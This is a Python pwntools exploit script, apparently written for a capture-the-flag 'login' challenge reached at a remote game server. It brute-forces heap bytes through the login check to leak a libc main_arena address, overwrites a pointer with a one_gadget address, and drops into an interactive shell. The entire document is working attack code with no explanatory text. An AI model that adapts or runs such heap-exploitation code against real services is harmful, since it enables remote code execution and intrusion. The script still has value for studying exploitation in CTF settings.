#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
from time import sleep
context.log_level = "critical"
context.binary = "./login"
elf = context.binary
libc = elf.libc
libc.sym['main_arena'] = 0x3c4b20
libc.sym['one_gadget'] = 0x4526a

#  io = process("./login")
io = remote("8sdafgh.gamectf.com", 20000)

def DEBUG():
    success("free @ {:#x}".format(0x400CA8))
    success("malloc @ {:#x}".format(0x40098D))
    success("strcmp @ {:#x}".format(0x400B94))
    success("edit @ {:#x}".format(0x400DAB))
    pause()

def login(idx, length, pwd):
    io.sendlineafter("Choice:\n", "1")
    io.sendlineafter("id:\n", str(idx))
    io.sendlineafter("length:\n", str(length))
    io.sendafter("password:\n", pwd)
    sleep(0.01)
    return io.recvline()

def register(idx, length, pwd):
    io.sendlineafter("Choice:\n", "2")
    io.sendlineafter("id:\n", str(idx))
    io.sendlineafter("length:\n", str(length))
    io.sendafter("password:\n", pwd)
    sleep(0.01)

def delete(idx):
    io.sendlineafter("Choice:\n", "3")
    io.sendlineafter("id:\n", str(idx))

def edit(idx, pwd):
    io.sendlineafter("Choice:\n", "4")
    io.sendlineafter("id:\n", str(idx))
    io.sendafter("pass:\n", pwd)
    sleep(0.01)

register(0, 0x100, '0' * 0x100)
register(1, 0x18, '1' * 0x18)

delete(0)

register(2, 0x100, 'x' * 4)
#  login(0, 5, 'x' * 4)

main_arena_part = 0
for i in range(0, 256)[::-1]:
    #  success(i)
    if "Login success!" in login(0, 6, 'x' * 4 + chr(i) + '\x7f'):
        main_arena_part = chr(i) + '\x7f'
        print(hexdump(main_arena_part))
        break


edit(2, 'x' * 11)
for i in range(0, 256)[::-1]:
    #  success(i)
    if "Login success!" in login(0, 14, 'x' * 11 + chr(i) + main_arena_part):
        main_arena_part = chr(i)  + main_arena_part
        print(hexdump(main_arena_part))
        break

delete(0)
register(3, 0x100, 'x' * 2)
for i in range(0, 256)[::-1]:
    #  success(i)
    if "Login success!" in login(0, 6, 'x' * 2 + chr(i) + main_arena_part):
        main_arena_part = chr(i) + main_arena_part
        print(hexdump(main_arena_part))
        break

edit(3, 'x' * 9)
for i in range(0, 256)[::-1]:
    #  success(i)
    if "Login success!" in login(0, 14, 'x' * 9 + chr(i) + main_arena_part):
        main_arena_part = chr(0x78) + chr(i)  + main_arena_part
        print(hexdump(main_arena_part))
        break

libc.address = u64(main_arena_part + '\0\0') - libc.sym['main_arena'] - 88 
print("libc @ {:#x}".format(libc.address))

delete(1)
register(4, 0x18, flat(0x602020, libc.sym['one_gadget']))

#  DEBUG()
login(1, 8, flat('\0' * 8))

io.interactive()
